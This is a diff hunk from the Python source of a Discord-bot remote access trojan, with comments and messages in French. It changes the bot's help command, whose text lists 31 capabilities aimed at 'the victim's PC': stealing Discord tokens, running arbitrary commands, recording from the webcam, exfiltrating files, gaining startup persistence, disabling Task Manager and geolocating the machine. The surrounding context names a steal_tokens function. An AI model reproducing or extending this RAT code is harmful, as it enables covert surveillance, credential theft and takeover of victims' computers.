@@ -290,48 +290,60 @@ async def steal_tokens(ctx):
     else:
         await ctx.send("Aucun token trouvé.")
 
-bot.remove_command('help')
-
-@bot.command(name='helps')
+@bot.command(name='rat_help')
 async def help_command(ctx):
     help_text = """
-**Commandes disponibles :**
+    Commandes disponibles :
 
-1. **+rat_help** - Affiche cette aide..
-2. **+screenshot** - Prend une capture d'écran et l'envoie dans le canal.
-3. **+open_url <url>** - Ouvre l'URL spécifiée dans le navigateur par défaut.
-4. **+system_info** - Affiche les informations système de la machine de la victime.
-5. **+open_calculator <number>** - Ouvre la calculatrice Windows le nombre de fois spécifié.
-6. **+voice <texte>** - Convertit le texte en parole et le prononce.
-7. **+steal_tokens** - Récupère les tokens Discord présents sur la machine.
-8. **+shutdown** - éteind le pc
-9. **+restart** - redémarre le pc
-10. **+message <type> <message>** affiche un message sur l'écran de la victime.
-11. **+<color> screen** met une couleur sur l'écran.
-12. **+cmd <commande>** execute une commande sur le pc de la victime.
-13. **+list_app** envoie un fichier contenant une liste de toutes les applications présentes sur le pc de la victime.
-14. **+webcam <temps>** prend une capture vidéo de la webcam avec le temps souhaité (en secondes).
-15. **+clear** permet de clear le canal pour alleger l'écran.
-16. **+install** télécharge un fichier sur le pc de la victime.
-17. **+block_mouse** permet de bloquer la souris.
-18. **+unblock_mouse** permet de débloquer la souris.
-19. **+play_s** permet de jouer un son sur l'ordinateur de la victime.
-20. **+play_v** permet de jouer une vidéo (avec son) sur l'ordinateur de la victime.
-21. **+startup** permet de mettre le RAT dans les éléments de démarage.
-22. **+block_taskmanager** permet de désactiver le gestionnaire des tâches. (BUG)
-23. **+unblock_taskmanager** permet de réactiver le gestionnaire des tâches. (BUG)
-24. **+volumemax** permet de mettre le volume au maximum.
-25. **+volumemin** permet de mettre le volume au minimum.
-26. **+list_folder** permet de lister tous les dossiers présents sur le pc de la victime.
-27. **+list_file <path/to/folder>** permet de lister tous les fichiers présents dans un dossier sur le pc de la victime.
-28. **+upload <path/to/file>** permet de télécharger un fichier présent sur le pc de la victime.
-29. **+logout** permet de déconnecter l'utilisateur du pc de la victime.
-30. **+wallpaper (fichier joint)** permet de changer le fond d'écran.
-31. **+geolocate** permet de géolocaliser l'ordinateur de la victime.
+    1. +rat_help - Affiche cette aide..
+    2. +screenshot - Prend une capture d'écran et l'envoie dans le canal.
+    3. +open_url <url> - Ouvre l'URL spécifiée dans le navigateur par défaut.
+    4. +system_info - Affiche les informations système de la machine de la victime.
+    5. +open_calculator <number> - Ouvre la calculatrice Windows le nombre de fois spécifié.
+    6. +voice <texte> - Convertit le texte en parole et le prononce.
+    7. +steal_tokens - Récupère les tokens Discord présents sur la machine.
+    8. +shutdown - éteind le pc
+    9. +restart - redémarre le pc
+    10. +message <type> <message> affiche un message sur l'écran de la victime.
+    11. +<color> screen met une couleur sur l'écran.
+    12. +cmd <commande> execute une commande sur le pc de la victime.
+    13. +list_app envoie un fichier contenant une liste de toutes les applications présentes sur le pc de la victime.
+    14. +webcam <temps> prend une capture vidéo de la webcam avec le temps souhaité (en secondes).
+    15. +clear permet de clear le canal pour alleger l'écran.
+    16. +install télécharge un fichier sur le pc de la victime.
+    17. +block_mouse permet de bloquer la souris.
+    18. +unblock_mouse permet de débloquer la souris.
+    19. +play_s permet de jouer un son sur l'ordinateur de la victime.
+    20. +play_v permet de jouer une vidéo (avec son) sur l'ordinateur de la victime.
+    21. +startup permet de mettre le RAT dans les éléments de démarage.
+    22. +block_taskmanager permet de désactiver le gestionnaire des tâches. (BUG)
+    23. +unblock_taskmanager permet de réactiver le gestionnaire des tâches. (BUG)
+    24. +volumemax permet de mettre le volume au maximum.
+    25. +volumemin permet de mettre le volume au minimum.
+    26. +list_folder permet de lister tous les dossiers présents sur le pc de la victime.
+    27. +list_file <path/to/folder> permet de lister tous les fichiers présents dans un dossier sur le pc de la victime.
+    28. +upload <path/to/file> permet de télécharger un fichier présent sur le pc de la victime.
+    29. +logout permet de déconnecter l'utilisateur du pc de la victime.
+    30. +wallpaper (fichier joint) permet de changer le fond d'écran.
+    31. +geolocate permet de géolocaliser l'ordinateur de la victime.
 
-*N'hésitez pas à utiliser les commandes ci-dessus pour interagir avec le RAT.*
-"""
-    await ctx.send(help_text)
+    N'hésitez pas à utiliser les commandes ci-dessus pour interagir avec le RAT.
+    """
+
+    try:
+        if len(help_text) > 2000:
+            with tempfile.NamedTemporaryFile(delete=False, suffix=".txt") as temp_file:
+                temp_file.write(help_text.encode('utf-8'))
+                temp_file_path = temp_file.name
+
+            await ctx.send("Voici les commandes disponibles :", file=discord.File(temp_file_path))
+
+            os.remove(temp_file_path)
+        else:
+            await ctx.send(help_text)
+
+    except Exception as e:
+        await ctx.send(f"Une erreur s'est produite : {e}")
 
 @bot.command(name='shutdown')
 async def shutdown(ctx):
